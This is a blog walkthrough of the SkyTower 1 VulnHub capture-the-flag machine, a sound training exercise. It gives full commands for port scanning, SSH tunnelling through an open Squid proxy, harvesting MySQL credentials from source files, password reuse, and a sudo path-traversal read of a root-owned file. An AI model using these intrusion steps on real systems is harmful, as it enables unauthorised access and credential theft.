---
layout: blog_item
title:  "SkyTower - Walkthrough"
date:   2015-07-20 15:00:60
author: Arr0way
description: 'SkyTower 1, a VulnHub CTF Walkthrough Guide'
categories: [walkthroughs]
tags:
- CTF
---

<div class="coffee-rating">
<table>
      <tbody>
        <tr>
           <td>
               <p><code>Coffee Difficulty Rating:</code></p>
           </td>
           <td>
               <p><i class="fa fa-coffee"></i><i class="fa fa-coffee"></i></p>
           </td>
        </tr>
      </tbody>
</table>
</div>

* list element with functor item
{:toc}

## Author Description

This CTF was designed by Telspace Systems for the CTF at the ITWeb Security Summit and BSidesCPT (Cape Town). The aim is to test intermediate to advanced security enthusiasts in their ability to attack a system using a multi-faceted approach and obtain the "flag".

You will require skills across different facets of system and application vulnerabilities, as well as an understanding of various services and how to attack them. Most of all, your logical thinking and methodical approach to penetration testing will come into play to allow you to successfully attack this system. Try different variations and approaches. You will most likely find that automated tools will not assist you.

**Author:** Telspace Systems

**Download:** [VulnHub](https://www.vulnhub.com)

## Enumeration

{% highlight bash %}

nmap -v -p 1-65535 -sV -O -sT 10.0.1.114

{% endhighlight %}


### Host Service Enumeration

<div class="mobile-side-scroller">
<table>
  <thead>
    <tr>
      <th>Port</th>
      <th>Service</th>
      <th>Version Detection</th>
    </tr>
  </thead>
      <tbody>
        <tr>
           <td>
               <pc><p><code>TCP: 80</code></p></pc>
           </td>
           <td>
               <pc><p>HTTP</p></pc>
           </td>
           <td>
               <pc><p>Apache httpd 2.2.22 ((Debian))</p></pc>
           </td>
        </tr>

        <td>
            <pc><p><code>TCP: 3128</code></p></pc>
        </td>
        <td>
            <pc><p>http-proxy</p></pc>
        </td>
        <td>
            <pc><p>Squid http proxy 3.1.20</p></pc>
        </td>
     </tr>

      </tbody>

</table>
</div>


## Web Application Analysis

The basic test below indicated the web application could be vulnerable to SQL injection.


![SQLi Test](/img/blog/skytower/sqli-test.png)

[SQL Injection](/penetration-testing/web-app/sql-injection/) looked possible + DB identified as MySQL:

![MySQL error](/img/blog/skytower/sqli-error.png)

Enumeration indicated the web application was filtering the SQLi attempts and removing some characters, such as <code>OR</code>. This was overcome (after researching for SQLi filtering evasion) using the following:

![Burp SQLi Evasion](/img/blog/skytower/burp-sqli-evasion.png)

With no direct access to SSH the above credentials could not be leveraged to gain a Shell.

## HTTP Proxy SSH Connection

The following was used to gain access to the SSH server by proxying the connection through the open **SQUID** server on the target machine.

Setup tunnel with proxytunnel:

{% highlight bash %}

[root:~]# proxytunnel -p 10.0.1.114:3128 -d 127.0.0.1:22 -a 4444

{% endhighlight %}

SSH through the HTTP tunnel:

{% highlight bash %}
[root:~]# ssh john@127.0.0.1 -p 4444  "/bin/sh"
john@127.0.0.1's password:

id
uid=1000(john) gid=1000(john) groups=1000(john)
{% endhighlight %}

<code>/bin/sh</code> needed to be postfixed to the end of the SSH command, as the server appeared to kick connections upon connection.

## Local Enumeration

Enumeration as the user John discovered the MySQL root credentials:

{% highlight bash %}

$ cat login.php
<?php

$db = new mysqli('localhost', 'root', 'root', 'SkyTech');

{% endhighlight %}

## MySQL Credentials

The following process was used to disclosed the users credentials:

{% highlight bash %}
$ mysql -u root -p
Enter password: root
show databases;


\q
Database
information_schema
SkyTech
mysql
performance_schema
$ mysql -u root -p SkyTech
Enter password: root
show tables;
\q
Tables_in_SkyTech
login



mysql -u root -p SkyTech
Enter password: rootroot
ERROR 1045 (28000): Access denied for user 'root'@'localhost' (using password: YES)
mysql -u root -p SkyTech
Enter password: root
select * from login;
\q
id    email    password
1    john@skytech.com    hereisjohn
2    sara@skytech.com    ihatethisjob
3    william@skytech.com    senseable
{% endhighlight %}

## Privilege Escalation - Password Reuse

Password reuse for the user <code>sara</code> was possible using the previously discovered credentials.

{% highlight bash %}

[root:~]# ssh sara@127.0.0.1 -p 4444 -t  "/bin/sh"
sara@127.0.0.1's password:
$ sudo -l
Matching Defaults entries for sara on this host:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sara may run the following commands on this host:
    (root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/*
{% endhighlight %}

The user **sara** had sudo access to the binary <code>/bin/cat</code>, path traversal was used to cat the contents of <code>/root/flag.txt</code> which contained the root password.

{% highlight bash %}

$ sudo /bin/cat /accounts/../root/flag.txt
Congratz, have a cold one to celebrate!
root password is theskytower
$

{% endhighlight %}

### Getting root:

With the previously discovered credentials it was possible to <code>su -</code> to root:

{% highlight bash %}

$ su -
Password:
root@SkyTower:~# id
uid=0(root) gid=0(root) groups=0(root)
root@SkyTower:~# cat flag.txt
Congratz, have a cold one to celebrate!
root password is theskytower
root@SkyTower:~#

{% endhighlight %}

## Conclusion

I enjoyed the SQL injection filtering evasion, overall a short CTF that can easily be done in an evening.    

Thanks for the VM :)
